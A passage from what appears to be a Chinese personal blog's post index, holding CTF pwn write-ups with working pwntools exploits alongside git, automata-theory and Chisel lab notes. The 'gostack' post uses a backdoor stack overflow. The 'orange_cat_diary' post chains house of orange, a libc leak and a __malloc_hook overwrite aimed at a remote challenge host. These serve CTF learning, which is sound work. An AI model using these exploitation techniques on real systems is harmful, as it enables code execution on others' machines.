/>\n\n\n\n后面发现fun2其实是后门，下班（x\n\nexp:\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\n#p = process('./gostack')\np = remote('?????')\nelf = ELF('./gostack')\n\nbackdoor = 0x4A05A0\nret = 0x4A0A9E\n#gdb.attach(p)\np.recvuntil('Input your magic message :')\npayload = b'\\x00' * 0x1d0 + p64(backdoor)\np.sendline(payload)\n\np.interactive()\n```\n\n不用后门的话还可以ret2syscall，相关的gadgets都能找到\n\n\n\n## orange_cat_diary\n\n这道其实是原题（\n\n原题是巅峰极客的snote\n\n分析文件：\n\n在delete操作这里free指针后没有置空，且只有一次delete机会，所以只有一次UAF：\n\n![image-20240811132940544](2024ciscn-pwn-复现/image-20240811132940544.png)\n\n同时也只有一次show的机会：\n\n![image-20240811153503806](2024ciscn-pwn-复现/image-20240811153503806.png)\n\n题目提示了orange，则从house of orange入手。\n\nHouse of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。\n\n![image-20240811153842551](2024ciscn-pwn-复现/image-20240811153842551.png)\n\ntopchunk的大小为0x20f91，首先修改top_chunk的size：\n\n利用堆溢出覆盖top_chunk的size字段，先申请一次堆块，然后编辑这个堆块大小+8的内容，额外的内容用0xf91覆盖。\n\n```python\nadd(0x68, b'aaaa')\nedit(0x70, b'a' * 0x68 + p64(0xf91))\n```\n\n这样就把top_chunk的size修改为了0xf91\n\n![image-20240811154106966](2024ciscn-pwn-复现/image-20240811154106966.png)\n\n然后申请一个大于0xf91的块，将top_chunk放入unsorted_bin中\n\n```python\nadd(0x1000, b\"bbbb\")\n```\n\n接着再申请一个chunk，这个chunk包含了main_arena+1640的信息，在debug中使用telescope查看刚刚申请的堆块可以看到这个堆块中的信息可以泄露main_arena的地址。\n\n```python\nadd(0x18, b'cccccccc')\n```\n\n![image-20240811154853874](2024ciscn-pwn-复现/image-20240811154853874.png)\n\n因此利用仅有一次的show就能够泄露main_arena的地址，得到这个根据libc中main_arena的偏移就能得到libc基地址，从而得到malloc_hook的地址。\n\n```python\nshow()\np.recvuntil(b'cccccccc')\nmain_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nlibc_base = main_arena - 0x3c4b20 - 1640\n```\n\n![image-20240811155120097](2024ciscn-pwn-复现/image-20240811155120097.png)\n\n接下来就能利用UAF打malloc_hook了。\n\n要注意的是这里要打的是malloc_hook - 0x23\n\n```python\nadd(0x68, b'dddd')\ndelete()\nmalloc_hook = libc.sym['__malloc_hook']\nedit(0x10, p64(libc_base + malloc_hook - 0x23))\n\none_gadget = libc_base + 0xf03a4 \nadd(0x68, b'a')\npayload = b'a' * 0x13 + p64(one_gadget)\nadd(0x68, payload)\n```\n\n然后再次调用malloc的时候就会触发onegadget：\n\n```python\np.recvuntil(b'Please input your choice:')\np.sendline(str(1))\np.recvuntil(b'the length of the diary content:')\np.sendline(str(114))\n```\n\n![image-20240811155604535](2024ciscn-pwn-复现/image-20240811155604535.png)\n\n远程也是打得通的，完整exp如下：\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\n# local 0   remote 1\nmode = 0\n\nif mode == 0:\n    p = process('./orange_cat_diary')\nelif mode == 1:\n    p = remote('pwn.challenge.ctf.show', 28205)\n    \nelf = ELF('./orange_cat_diary')\nlibc = ELF('./libc.so.6')\n\ndef add(size, content):\n    p.recvuntil(b'Please input your choice:')\n    p.sendline(str(1))\n    p.recvuntil(b'the length of the diary content:')\n    p.sendline(str(size))\n    p.recvuntil(b'Please enter the diary content:')\n    p.send(content)\n    \ndef show():\n    p.recvuntil(b'Please input your choice:')\n    p.sendline(str(2))\n\ndef delete():\n    p.recvuntil(b'Please input your choice:')\n    p.sendline(str(3))\n    \ndef edit(size, content):\n    p.recvuntil(b'Please input your choice:')\n    p.sendline(str(4))\n    p.recvuntil(b'the length of the diary content:')\n    p.sendline(str(size))\n    p.recvuntil(b'Please enter the diary content:')\n    p.send(content)\n    \ndef debug():\n    debug_addr=0x0EDA\n    gdb.attach(p, 'b *$rebase({})'.format(debug_addr))\n\np.recvuntil(\"Hello, I'm delighted to meet you. Please tell me your name.\")\np.send(b'fuckyou')\nadd(0x68, b'aaaa')\nedit(0x70, b'a' * 0x68 + p64(0xf91))\n\nadd(0x1000, b\"bbbb\")\nadd(0x18, b'cccccccc')\n\n# leak main_arena, libc_base, heap_base\nshow()\np.recvuntil(b'cccccccc')\nmain_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint('[+] main_arena_off: ', hex(libc.sym['main_arena']))\nprint('[+] main_arena_addr: ', hex(main_arena))\n# 0x3c4b20 + 1640\nlibc_base = main_arena - 0x3c4b20 - 1640\nprint('[+] libc_base: ', hex(libc_base))\n# 泄露堆地址，不过这题实际上并不需要泄露堆地址就能做\np.recv(3)\nheap = u64(p.recv(6).ljust(8,b'\\x00'))\nheap_addr = heap << 8\nprint('[+] heap_addr: ', hex(heap_addr))\n#debug()\n\n# UAF\nadd(0x68, b'dddd')\ndelete()\nmalloc_hook = libc.sym['__malloc_hook']\n# libc 2.23 need malloc_hook - 0x23\nedit(0x10, p64(libc_base + malloc_hook - 0x23))\n\none_gadget = libc_base + 0xf03a4 \nadd(0x68, b'a')\npayload = b'a' * 0x13 + p64(one_gadget)\nadd(0x68, payload)\n\np.recvuntil(b'Please input your choice:')\np.sendline(str(1))\np.recvuntil(b'the length of the diary content:')\np.sendline(str(114))\np.interactive()\n    \n```\n\n\n\n","tags":["pwn"],"categories":["CTF","pwn"]},{"title":"2024省赛初赛Pwn WP","url":"/2024/05/12/2024省赛初赛Pwn-WP/","content":"\n# 2024省赛初赛Pwn WP\n\n这次省赛十分难绷，初赛只有这一道pwn，而且有个地方判断逻辑写反了导致绕过特别简单（\n\n### pwn_server\n\n分析server文件，观察得到\n\n![image-20240512154808386](2024省赛初赛Pwn-WP/image-20240512154808386.png)\n\n进入sub_400B8A之前将buf用':'分割，得到的两部分作为这个函数的参数\n\n在这个函数中发现可能存在整数溢出漏洞：\n\n<img src=\"2024省赛初赛Pwn-WP/image-20240512155500185.png\" alt=\"image-20240512155500185\" style=\"zoom:67%;\" />\n\n当首位为0的时候会直接返回-1\n\n这个函数中对两个输入参数拼接并全部异或0x30：\n\n<img src=\"2024省赛初赛Pwn-WP/image-20240512155602874.png\" alt=\"image-20240512155602874\" style=\"zoom:67%;\" />\n\n这里将s1的v11位复制给v7：\n\n![image-20240512155706003](2024省赛初赛Pwn-WP/image-20240512155706003.png)\n\n结合上面的分析考虑利用整数溢出，当第一个:前首位为0的时候，首先传入的是字符0，绕过下面的第一层长度判断后，在上面异或操作后字符0变为字节0，因此v11的返回值为-1，即0xff。\n\n![image-20240512155811882](2024省赛初赛Pwn-WP/image-20240512155811882.png)\n\n那么就是将s1的0xff字节复制给v7\n\ns1在栈上的位置为：\n\n![image-20240512155943962](2024省赛初赛Pwn-WP/image-20240512155943962.png)\n\nv7在栈上的位置为：\n\n![image-20240512155959093](2024省赛初赛Pwn-WP/image-20240512155959093.png)\n\n回到前面注意到flag字符串存在s中，且在操作之前将所有char类型的变量都用0进行了初始化：\n\n![image-20240512160045537](2024省赛初赛Pwn-WP/image-20240512160045537.png)\n\n而s在栈上的位置为：\n\n![image-20240512160130751](2024省赛初赛Pwn-WP/image-20240512160130751.png)\n\n在距s1的0xff字节以内，因此可以把flag复制过去\n\n接着注意到下面的代码：\n\n![image-20240512160220125](2024省赛初赛Pwn-WP/image-20240512160220125.png)\n\n由于memcmp返回值为0的时候s1==s2，然而前面加了个！，导致不是正确key的任意字符都能绕过这里（\n\n![image-20240512160322565](2024省赛初赛Pwn-WP/image-20240512160322565.png)\n\n这里open的为file，而file的在栈上的位置在v7下面，经过计算，flag复制到v7的位置也在flag的范围中，而flag其他内容为0，那么open file效果就是open flag，因此得到flag\n\n综上，只要第一段为0开头且小于8位长度，第二段为任意字符串即可获得flag\n\n![image-20240512160701954](2024省赛初赛Pwn-WP/image-20240512160701954.png)\n\n","tags":["pwn"],"categories":["pwn"]},{"title":"git相关报错的解决方法汇总","url":"/2024/01/17/git相关报错的解决方法汇总/","content":"\n# git相关报错的解决方法汇总\n\n本文为git使用遇到的相关报错的解决方法汇总，后面遇到新的报错解决会更新到这里。\n\n<!-- toc -->\n\n## 报错“ssh:connect to host github.com port 22: Connection timed out“\n\n**1、首先检验22端口是否出问题**\n\n```shell\nssh -T git@github.com\n```\n\n如果执行上面的命令仍然出现timed out，则说明可能是22端口出问题了。\n\n**2、更改ssh配置文件**\n\n进入~/.ssh/目录（C:\\users\\username\\.ssh\\），如果没有config文件，则创建一个，打开config文件，添加或更改为以下配置：\n\n```config\nHost github.com\n  HostName ssh.github.com\n  Port 443\n  IdentityFile ~/.ssh/id_rsa\n```\n\n大致意思为更改默认端口为443。\n\n再次执行`ssh -T git@github.com`指令，若出现如下图信息则说明问题解决：\n\n![image-20240117144427614](git相关报错的解决方法汇总/image-20240117144427614.png)\n","tags":["github"],"categories":["Git"]},{"title":"形式语言与自动机期末复习总结","url":"/2024/01/12/形式语言与自动机期末复习总结/","content":"\n# 形式语言与自动机期末复习总结\n\n本文为本人考前复习自动机的时候简单总结的一些知识点和题型的做法的人话版本，对于概念、专有名词的说明可能不够准确，**只适用于考前突击能做出题就行的情况**，若时间充裕请认真理解课本以及ppt对相关概念、定理和算法的描述与证明。一些内容可能存在问题，水平有限敬请谅解。\n\n<!-- toc -->\n\n### 第一章 绪论\n\n笛卡尔积：\n\n<img src=\"形式语言与自动机期末复习总结/image-20240111230116137.png\" alt=\"image-20240111230116137\" style=\"zoom:67%;\" />\n\n两个集合叉乘相当于将两个集合元素全排列\n\n例题：\n\n```\n集合A={1,2,3}，集合B={a,b,c}, 计算笛卡尔积AXB\n\nAXB={(1,a),(1,b),(1,c),(2,a),(2,b),(2,c),(3,a),(3,b),(3,c)}\n```\n\n\n\n幂集：\n\n<img src=\"形式语言与自动机期末复习总结/image-20240111230227666.png\" alt=\"image-20240111230227666\" style=\"zoom:67%;\" />\n\n例题：\n\n```\n集合A={a,b,c},计算A的幂集2A\n\n2A={Φ, {a}, {b} , {c} , {a,b} , {a,c} , {b,c} , {a,b,c}}\n```\n\n\n\n* **闭包(closure)** \n  设P是关于关系的性质的集合，关系R的P闭包(closure)是包含R并且具有P中所有性质的最小关系。\n  **正闭包(positive closure)** \n  (1)R是R+的子集。\n  (2)如果(a，b)，(b，c)∈R+ 则(a，c)∈R+。\n  (3)除(1)、(2)外，R+不再含有其他任何元素。 \n\n  **克林闭包**R*\n\n  正闭包+0次幂\n\n\n\n#### **字母表**\n\n字母表是一个**<u>非空有穷</u>**集合，字母表中的元素称为该字母表的一个字母(letter)。又叫做符号(symbol)、或者字符(character)。\n\n字符具有整体性（**不可分性**）和可辨认性（**可区分性**）\n\n例题：\n\n**<img src=\"形式语言与自动机期末复习总结/image-20240111232250755.png\" alt=\"image-20240111232250755\" style=\"zoom:67%;\" />**\n\n\n\n#### 递归证明\n\n* **递归定义：**\n  又称为归纳定义(inductive definition)，它来定义一个集合。\n  集合的递归定义由三部分组成：\n  **基础(basis)：**用来定义该集合的最基本的元素。\n  **归纳(induction)：**指出用集合中的元素来构造集合的新元素的规则。\n  **极小性限定：**指出一个对象是所定义集合中的元素的充要条件是它可以通过有限次的使用基础和归纳条款中所给的规定构造出来。 \n* **归纳证明 ：**\n  与递归定义相对应。 \n  归纳证明方法包括三大步： \n  基础(basis)：证明最基本元素具有相应性质。 \n  **归纳(induction)：**证明如果某些元素具有相应性质，则根据这些元素用所规定的方法得到的新元素也具有相应的性质。\n  根据归纳法原理，所有的元素具有相应的性质。  \n\n\n\n**归纳证明流程：**\n\n①基础：在n=0的时候，满足条件\n\n②归纳：假设n的时候成立，试证n+1的时候同样成立\n\n③由归纳法原理，结论对任意有穷集合成立\n\n\n\n归纳证明例题：\n\n![image-20240111233619094](形式语言与自动机期末复习总结/image-20240111233619094.png)\n\n![image-20240112174118391](形式语言与自动机期末复习总结/image-20240112174118391.png)\n\n**语言例题：**\n\n设∑={0，1} ，请给出上∑的下列语言的形式表示：\n\n  (1) 所有以0开头的串。       {0}{0,1}*\n\n  (2) 所有以11开头，以11结尾的串     {11}{0,1}*{11}\n\n  (3) 所有包含子串001的串    {0,1}*{001}{0,1}*\n\n  (4) 所有正数第10个字符是0的串    {0,1}^9{0}{0,1}*\n\n  (5) 所有不包含3个连续0的串   {001, 01, 1}*\n\n\n\n几个重要的基本概念：\n\n<img src=\"形式语言与自动机期末复习总结/image-20240111233231821.png\" alt=\"image-20240111233231821\" style=\"zoom:67%;\" />\n\n\n\n\n\n### 第二章 文法\n\n文法定义：\n\n**G=(V, T, P, S)**\n\nV---变量\n\nT---终结符\n\nP---产生式\n\nS---起始符号\n\n例如：({A}，{0，1}，{A→01，A→0A1，A→1A0}，A)\n\n候选式：产生式  A→a|b|c  中，a，b，c分别为候选式\n\n\n\n**文法推导**\n\n给出文法和句子，根据文法推导句子的产生过程\n\n例2-4： 设G=({A}，{a}，{A→a|aA}，A)，句子aaaaa的推导过程？\n\n```\nA→aA→aaA→aaaA→aaaaA→aaaaa\n其中前四步使用产生式A→aA，最后一步使用产生式A→a\n```\n\n\n\n**文法的乔姆斯基体系** \n\n0型文法（**PSG**）：短语结构文法\n\n1型文法（**CSG**）：对于任意产生式，都有右边数量大于等于左边，则为1型文法，也称之为**上下文有关文法**\n\n2型文法（**CFG**）：在1型文法的基础上，若满足产生式左边的都为非终结符，则为2型文法，也称之为**上下文无关文法**\n\n3型文法（**RG**）：正则文法，产生式左边为单一终结符，右边为一串终结符和一个非终结符的组合（左线性或右线性）\n\n左线性文法：基本形式为A→Aa\n\n右线性文法：基本形式为A→aA\n\n\n\n**文法设计：**\n\n\n\n### 第三章 DFA NFA\n\n即时描述迁移：\n\n例子：对于如下DFA，写出其即时描述迁移：\n\n![image-20240112004404023](形式语言与自动机期末复习总结/image-20240112004404023.png)\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112004430577.png\" alt=\"image-20240112004430577\" style=\"zoom:67%;\" />\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112004437391.png\" alt=\"image-20240112004437391\" style=\"zoom:67%;\" />\n\n根据接受的输入变化状态\n\n\n\n#### ε-NFA FA\n\n#### **线性文法DFA构造：**\n\n右线性文法DFA构造：\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112012000062.png\" alt=\"image-20240112012000062\" style=\"zoom: 50%;\" />\n\n使用产生式对应的方式，构造路径\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112012008981.png\" alt=\"image-20240112012008981\" style=\"zoom: 50%;\" />\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112012032984.png\" alt=\"image-20240112012032984\" style=\"zoom:67%;\" />\n\n左线性文法DFA构造：\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112011819710.png\" alt=\"image-20240112011819710\" style=\"zoom:67%;\" />\n\n同样使用产生式对应的方式，构造路径\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112011834789.png\" alt=\"image-20240112011834789\" style=\"zoom:67%;\" />\n\n​                                                                                    终结符用 **Z** 表示\n\n右线性文法DFA转换为等价左线性文法：\n\n将DFA的所有箭头反过来，S输入改到Z处，将E作为终结状态，即改为左线性文法对应的DFA。\n\n对于每个状态，产生式为来源状态后跟读入数据。例如：A→C1|1\n\n\n\n#### ε-NFA转DFA\n\n两步：\n\n①ε-NFA转NFA： 根据ε-NFA状态转移表画出NFA的状态转移表\n\n②NFA转DFA： 根据NFA状态转移表，先将初始状态放入，查看到达的状态集合，并将新出现的集合放入列表，类似下表的形式。最后，将包含原NFA终止态的节点设置为终止节点，然后画出对应的DFA即可（可以对新的节点重命名）\n\n<img src=\"形式语言与自动机期末复习总结/微信图片_20240112165403.jpg\" alt=\"微信图片_20240112165403\" style=\"zoom:30%;\" />\n\n\n\n### 第四章 RE\n\n#### **RE到FA的等价变换：归纳构造法**\n\n对于一个正则表达式，不同的单元可以变换为如下形式的FA部分，其中形如（0+1）类型则表示为分支\n\n(下图箭头上没内容的都为ε)\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112012753904.png\" alt=\"image-20240112012753904\" style=\"zoom:30%;\" />\n\n例子：\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112012908905.png\" alt=\"image-20240112012908905\" style=\"zoom:67%;\" />\n\n\n\n\n\n#### DFA转正则表达式\n\n初始化：设定一个x状态，空转移指向起始状态，设定一个Y状态，将所有终结状态空转移指向Y、\n\n按指定顺序依次去掉所有状态，直到最后只剩下X指向Y的路径，则此时的表达式为DFA的等价正则表达式\n\n\n\n### 第五章 正则语言的封闭性\n\n**定理：RL在交运算下封闭**\n\n使用场景：要求构造同时满足多个条件的DFA时，可以通过分别构造满足对应条件的DFA，然后通过交运算合成最终的DFA\n\n例子：\n\n![image-20240112013214125](形式语言与自动机期末复习总结/image-20240112013214125.png)\n\n左边两个DFA在经过交运算后形成右边的DFA\n\n\n\n#### DFA极小化\n\n对于一个DFA，可以使用画表法进行极小化：\n\n这里采用的是下三角画表\n\n以下图为例：\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112030130624.png\" alt=\"image-20240112030130624\" style=\"zoom:50%;\" />\n\n假设DFA有n个状态，行为0-n-1，列为1-n\n\n目标：找出可区分状态并在标上标上x\n\n初始化：首先，最先能找到的可区分的状态为非终止状态和终止状态，如下图q0是非终结状态，q2为终结状态，则q0与q2是可区分的，因此在表上对应q0-q2处应打x\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112030841025.png\" alt=\"image-20240112030841025\" style=\"zoom:50%;\" />\n\n下一步：不断循环下面的过程：找到两个未标记的状态p，q，若存在一个输入a，使得{δ(p,a)，δ(q,a)}是已经被标记的，即p和q经过a输入跳转到的状态是否是可区分的，如果是可区分的，则为{p,q}加上标记，在表上p-q处打x。对于状态p和q，只有遍历所有的输入之后到达的状态都是不可区分的，p和q才是不可区分的。\n\n遍历所有对之后，在表中下三角部分观察是否存在未标记，即不可区分的状态，若有，则极小化后的DFA中这些状态要合并为一个状态。\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112030830458.png\" alt=\"image-20240112030830458\" style=\"zoom:50%;\" />\n\n\n\n#### 正则语言的性质\n\n* 判定性质：**泵引理**及其应用\n* 封闭性质：并、乘积、闭包、补、交的封闭性\n\n\n\n判定性质：\n\n* 成员判定：判定某一字符串是否在一个正则语言L中\n\n* 空否判定：判定正则语言L是否为空\n\n  步骤：假定语言描述为DFA：\n  1、构建状态转移图；\n  2、计算从开始状态q0出发，所有可达到状态的集合；\n  3、若任何接受状态是可到达的，则该语言非空，否则该语言为空。\n\n* 无穷判定：判定正则语言L是否为无穷\n\n  步骤：给定L对应的DFA：\n\n  * 若**该DFA有n个状态, L包含长度大于等于n的字符串，则该语言无穷。**\n  * 否则，该语言L一定是有穷的。\n\n无穷判定的证明：如果一个DFA有n个状态，并接受长度大于等于n的字符串w，**那么在w的路径上，一定包含一个状态出现了至少两次。**\n\n原因：长度大于等于n的字符串w的路径上**经过的状态数量至少为n+1**\n\n\n\n#### 泵引理\n\n用于证明一个语言L**不是**RL\n\n直接上题，抄板子基本就能做题\n\nz=uvw\n\n假设v=0^k^ ，由于|uv|≤N，则设w=0^j^， u=0^N-k-j^，这里的N为一个常量\n\n然后求uv^i^w的值，计算指数，检验结果是否和原来的是等价的\n\n\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112163635120.png\" alt=\"image-20240112163635120\" style=\"zoom:67%;\" />\n\n![image-20240112014419364](形式语言与自动机期末复习总结/image-20240112014419364.png)\n\n使用泵引理证明一个语言不是RL的目标：证明最后推出的正则表达式中，不符合一开始给出的语言的格式。例如形如0^N^1^N^，则最后证明出N+k>N\n\n形如0^N^，N为素数，则是证明最后的计算结果不是素数，不满足原始的条件\n\n\n\n##### 等价性判断\n\n给定一个RL语言L与M，判断L是否等于M\n\n**从L跟M的DFA出发，构建一个乘积DFA** \n\n*构造了然后呢？*\n\n\n\n### 第六章 上下文无关语言\n\n#### 消除无用符号：\n\n1、去不可派生：\n\n①初始化OLDV={∅}，根据产生式找到存在能够推出终结符的产生式的非终结符，将其加入NEWV中\n\n②将上一步得到的NEWV作为新的OLDV，首先新的NEWV中包含OLDV的所有元素，然后查找所有能够推导出OLDV中非终结符的非终结符（父亲），将它们加入新的NEWV中\n\n③重复②，直到OLDV=NEWV，终止\n\n④终止后，删去原文法中在NEWV中不存在的符号（非终结符）\n\n\n\n2、去不可达：\n\n①初始化OLDV={∅}，OLDT={∅}，其中OLDV保存非终结符，OLDT保存终结符，然后从S开始，先将S加入NEWV，然后看S的产生式，将其能够到达的非终结符加入NEWV中，NEWT同理\n\n②查找OLDV对应的所有产生式，将可达的非终结符加入NEWV，终结符加入NEWT\n\n③重复②，直到OLDV=NEWV, OLDT=NEWT，终止\n\n④新的文法中只保留在NEWV和NEWT的元素的产生式\n\n例子：\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112170905448.png\" alt=\"image-20240112170905448\" style=\"zoom:67%;\" />\n\n\n\n#### **去ε产生式：**\n\n①初始化OLDU={∅}，NEWU中加入能够推导出空串的非终结符\n\n②OLDU为上一步的NEWU，NEWU先包含OLDU的所有元素，然后查找其他产生式，如果存在有非终结符能够推导出的整体为空（所有部分都位于OLDU中），则将其加入NEWU中\n\n③重复②，直到NEWU=OLDU，终止\n\n④对于NEWU中存在的非终结符，将其空产生式去掉，然后增加在其他情况中，该终结符为空的情况；对于推导出这些非终结符中的非终结符，将原来可能为空的非终结符替换为前面更新的所有产生式。特别地，如果推导出S→ε，则这一条是无法消除的。\n\n例子：\n\n<img src=\"形式语言与自动机期末复习总结/image-20240112171711097.png\" alt=\"image-20240112171711097\" style=\"zoom: 67%;\" />\n\n\n\n\n\n### 一些定义\n\n* 文法定义：G=(V，T，P，S) ，V：变量， T：终结符， P：产生式， S：开始符号\n\n* DFA元组定义：M=(Q，∑，δ，q0，F)，Q：状态集合， ∑：字母表， δ：状态转移函数， q0：起始状态， F：终止状态\n\n​\t\t*文法定义中的成分容易与DFA定义成分混淆*\n\n* 左线性文法与有限自动机等价\n\n* Moore机和Mealy机等价\n* 不是正则语言的经典例子：{a^n^b^n^|n≥0}\n* 对于两个正则表达式r和s，以下几个等式是正确的：r+s=s+r, r^*^r=rr^*^，以下等式是错误的：rs=sr\n* 任意派生树的最左推导是唯一的\n* 设计一个无穷语言最少需要2个产生式\n* 对于任意非空集合Σ，ε∉Σ\n* 2NFA 允许双向移动，因此 2NFA 的描述能力比 NFA 强。×\n* 有穷语言都是正则语言 ×\n* 一个问题，如果不存在一个 FA 接受它的语言，则称此问题是不可判定的。 ×\n* 空串是任意串的真前缀和真后缀。 ×  空串不能是自己的真前缀\n* ε-NFA 允许空迁移和非空迁移，而 NFA 只允许非空迁移，因此 ε-NFA 比 NFA 强。× \n* 对于上面，ε-NFA，NFA，DFA是等价，可以相互转换，因此这几个都是一样强\n","tags":["形式语言与自动机"],"categories":["形式语言与自动机"]},{"title":"深圳大学计算机系统(3)实验 Chisel语言设计","url":"/2023/12/01/Chisel语言设计/","content":"\n\n# 深圳大学计算机系统(3)实验 Chisel语言设计\n\nchisel的视频学习可以看这里：<a href=\"https://www.bilibili.com/video/BV1m44y1c7DZ\" target=\"_blank\">Chisel数字系统设计基础</a>\n\n<!-- toc -->\n\n## 1、环境安装\n\n本次实验需要用到chisel环境进行电路设计以及测试，并生成vcd信号文件，同时还需要在linux虚拟机中安装gtkwave软件来显示vcd信号文件的信号。\n\n### 1.1 chisel环境安装\n\nchisel环境安装这里提供两种方法。\n\n方法一：按照课件ppt中的安装流程在linux虚拟机中进行配置\n\n***注意：使用sbt下载的时候如果出现下载非常慢或卡死的状态可能需要换源***\n\n方法二：使用JB家的IDEA可以直接安装和配置scala以及chisel的环境，这里不多赘述，可以直接在windows系统中编写程序和运行，仅需要将生成的vcd文件复制到虚拟机中用gtkwave打开即可。\n\n### 1.2 安装gtkwave\n\n```shell\nsudo apt-get install gtkwave\n```\n\n\n\n## 2、电路设计\n\n### 2.1 译码电路设计\n\n```scala\nimport chisel3._\nimport chisel3.util._\n\nclass MIPSInstructionDecoder extends Module {\n  val io = IO(new Bundle {\n    val instr_word = Input(UInt(32.W))\n    val add_op = Output(Bool())\n    val sub_op = Output(Bool())\n    val lw_op = Output(Bool())\n    val sw_op = Output(Bool())\n    val nop = Output(Bool())\n    //解析寄存器\n    val Reg1 = Output(UInt(5.W))\n    val Reg2 = Output(UInt(5.W))\n    val Reg3 = Output(UInt(5.W))\n  })\n\n  val opcode = io.instr_word(31, 26)\n  val funinfo = io.instr_word(5, 0)\n  \n  io.add_op := false.B;\n  io.sub_op := false.B;\n  io.lw_op := false.B;\n  io.sw_op := false.B;\n  io.nop := false.B;\n\n  io.Reg3 := io.instr_word(25,21) //target\n  io.Reg1 := io.instr_word(20,16) //src\n  io.Reg2 := io.instr_word(15,11)\n  when(opcode === \"b000000\".U)\n  {\n    when(funinfo === \"b100000\".U)\n    {\n      io.add_op := true.B;\n    }\n    .elsewhen(funinfo === \"b100010\".U)\n    {\n      io.sub_op := true.B;\n    }\n  }\n  .elsewhen(opcode === \"b100011\".U)\n  {\n    io.lw_op := true.B;\n  }\n  .elsewhen(opcode === \"b101011\".U)\n  {\n    io.sw_op := true.B;\n  }\n  .otherwise\n  {\n    io.nop := true.B;\n  }\n}\n\nobject MIPSInstructionDecoder extends App {\n  (new chisel3.stage.ChiselStage).emitVerilog(new MIPSInstructionDecoder (), \tArray(\"--target-dir\",\"generated\"))\n}\n```\n\n创建IO，其中输入为32位指令，下面五个bool信号为五种类型指令的鉴别信号，同时根据输入的指令解析出其中对应的寄存器编号（如有）。\n\nOpcode为指令前6位，funinfo为指令后6位，add和sub指令的前6位均为0，因此需要靠后6位来区分。首先初始化五种指令，然后根据指令内容进行译码。\n\n\n\n测试代码：\n\n```scala\nimport org.scalatest.flatspec.AnyFlatSpec\nimport chisel3._\nimport chiseltest._\n\nclass MIPSInstructionDecoderSpec extends AnyFlatSpec with ChiselScalatestTester {\n  behavior of \"MIPSInstructionDecoder\"\n\n  it should \"TestInstructions\" in {\n    test(new MIPSInstructionDecoder).withAnnotations(Seq(WriteVcdAnnotation)) { c =>\n      c.io.instr_word.poke(\"b00000000001000100001100000100000\".U) \n      // add R1, R2, R3\n      c.clock.step(1)\n      c.io.add_op.expect(true.B)\n      c.io.sub_op.expect(false.B)\n      c.io.lw_op.expect(false.B)\n      c.io.sw_op.expect(false.B)\n      c.io.nop.expect(false.B)\n\n      c.io.instr_word.poke(\"b00000000000001010011000000100010\".U) \n      // sub R0, R5, R6\n      c.clock.step(1)\n      c.io.add_op.expect(false.B)\n      c.io.sub_op.expect(true.B)\n      c.io.lw_op.expect(false.B)\n      c.io.sw_op.expect(false.B)\n      c.io.nop.expect(false.B)\n\n      c.io.instr_word.poke(\"b10001100101000100000000001100100\".U) \n      // lw R5, 100(R2)\n      c.clock.step(1)\n      c.io.add_op.expect(false.B)\n      c.io.sub_op.expect(false.B)\n      c.io.lw_op.expect(true.B)\n      c.io.sw_op.expect(false.B)\n      c.io.nop.expect(false.B)\n\n      c.io.instr_word.poke(\"b10101100101000100000000001101000\".U) \n      // sw R0, 104(R2)\n      c.clock.step(1)\n      c.io.add_op.expect(false.B)\n      c.io.sub_op.expect(false.B)\n      c.io.lw_op.expect(false.B)\n      c.io.sw_op.expect(true.B)\n      c.io.nop.expect(false.B)\n\n      c.io.instr_word.poke(\"b00001100000000000000000001100100\".U) \n      // jal 100\n      c.clock.step(1)\n      c.io.add_op.expect(false.B)\n      c.io.sub_op.expect(false.B)\n      c.io.lw_op.expect(false.B)\n      c.io.sw_op.expect(false.B)\n      c.io.nop.expect(true.B)\n    }\n  }\n}\n```\n\n共执行5个时钟周期，依次向instr_word输入add R1,R2,R3; sub R0,R5,R6，lw R5,100(R2), sw R5,104(R2)、JAL 100指令的数据，并进行检验。\n\n\n\n测试结果：\n\n![decoder测试结果](Chisel语言设计/image-20240120215647120.png)\n\n\n\n观察波形：\n\n![decoder波形](Chisel语言设计/image-20240120215728554.png)\n\n第一个时钟周期过后，instr_word内容更改为add R1,R2,R3;对应的32位数据，opcode为0，funinfo为0x20，add_op为1，说明正确译码。\n\n后面的几个时钟周期结果与上面类似，这里不作展示。\n\n\n\n### 2.2 寄存器文件电路设计\n\n```scala\nimport chisel3._\nimport chisel3.util._\nimport chisel3.stage.ChiselStage\n\nclass RegisterFile extends Module {\n  val io = IO(new Bundle {\n    val RS1 = Input(UInt(5.W))\n    val RS2 = Input(UInt(5.W))\n    val WB_data = Input(UInt(32.W))\n    val Reg_WB = Input(UInt(5.W))\n    val RS1_out = Output(UInt(32.W))\n    val RS2_out = Output(UInt(32.W))\n  })\n\n  val registers = RegInit(VecInit((0 until 32).map(_.U(32.W))))\n\n  io.RS1_out := registers(io.RS1)  //读取RS1\n  io.RS2_out := registers(io.RS2)  //读取RS2\n\n  when(io.Reg_WB =/= 0.U)\n  {\n    registers(io.Reg_WB) := io.WB_data  //将WB_data写入到Reg_Wb\n  }\n  .otherwise //0寄存器不作任何改变，保证其恒为0\n  {\n    registers(io.Reg_WB) := registers(io.Reg_WB)\n  }\n}\n\nobject RegisterFileMain extends App {\n  (new ChiselStage).emitVerilog(new RegisterFile, Array(\"--target-dir\", \"generated\"))\n}\n```\n\nIO信号中，定义RS1，RS2，WB_data,Reg_WB输入，RS1_out, 